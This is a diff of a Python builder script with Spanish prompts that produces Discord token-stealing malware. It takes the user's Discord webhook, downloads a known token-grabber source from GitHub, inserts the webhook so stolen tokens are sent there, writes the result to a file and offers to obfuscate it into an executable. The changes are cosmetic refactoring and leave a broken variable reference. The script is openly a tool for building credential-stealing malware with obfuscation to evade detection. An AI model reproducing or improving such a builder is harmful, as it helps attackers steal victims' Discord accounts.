@@ -1,26 +1,24 @@
-import os, shutil, requests, base64, random,time
-
+import os, sys, shutil, requests, base64, random
+from time import sleep
 from Crypto.Cipher import AES
 from Crypto import Random
 from pystyle import Colors
-
+def tortuga(_str):
+    for letra in _str:
+        sys.stdout.write(letra);sys.stdout.flush();sleep(0.03)
 def create_grabber():
     webhookUrl = input(f"\n {Colors.purple}[{Colors.light_blue}>{Colors.purple}] Webhook: {Colors.white}")
     if "https://discord.com/api/webhooks" in webhookUrl:
         fileName = input(f" {Colors.purple}[{Colors.light_blue}>{Colors.purple}] Nombre del archivo: {Colors.white}")
         print(f"\n {Colors.purple}[{Colors.light_blue}+{Colors.purple}]{Colors.light_green} Escribiendo codigo...")
-        time.sleep(.3)
-    src = requests.get("https://raw.githubusercontent.com/Rdimo/Hazard-Token-Grabber-V2/master/main.py").text.replace("WEBHOOK_HERE", webhookUrl) #Rdimo token grabber
+        sleep(.3)
+    code = requests.get("https://raw.githubusercontent.com/Rdimo/Hazard-Token-Grabber-V2/master/main.py").text.replace("WEBHOOK_HERE", webhookUrl) #Rdimo token grabber
     with open(f"{fileName}.py", 'w', errors="ignore") as f:
-        f.write(src)
+        f.write(code)
 
-def tortuga(_str):
-    for letra in _str:
-        sys.stdout.write(letra);sys.stdout.flush();sleep(0.03)
-
-    print(f"\n {Colors.purple}[{Colors.red}!{Colors.purple}]{Colors.white} ¿Deseas ofuscar {fileName}.exe?")
-    siono = input(f'\n {Colors.purple}[{Colors.light_blue}>{Colors.purple}] {Colors.purple}y{Colors.light_blue}/{Colors.red}n: {Colors.white}')
-    if siono.lower() == "y" or siono.lower() == "yes":
+    tortuga(f"\n {Colors.purple}[{Colors.red}!{Colors.purple}]{Colors.white} ¿Deseas ofuscar {fileName}.exe?")
+    yesno = input(f'\n {Colors.purple}[{Colors.light_blue}>{Colors.purple}] {Colors.purple}y{Colors.light_blue}/{Colors.purple}n: {Colors.white}')
+    if yesno.lower() == "y" or siono.lower() == "yes":
         IV = Random.new().read(AES.block_size)
         key = u''
         for i in range(8):
@@ -51,4 +49,4 @@ def tortuga(_str):
     except FileNotFoundError:
         pass
 
-    print(f"\n{Colors.purple}EL archivo {fileName}.exe ha sido creado correctamente\n")
+    tortuga(f"\n {Colors.purple}[{Colors.light_blue}+{Colors.purple}] EL archivo {Colors.light_red}{fileName}.exe{Colors.purple} ha sido creado correctamente\n")
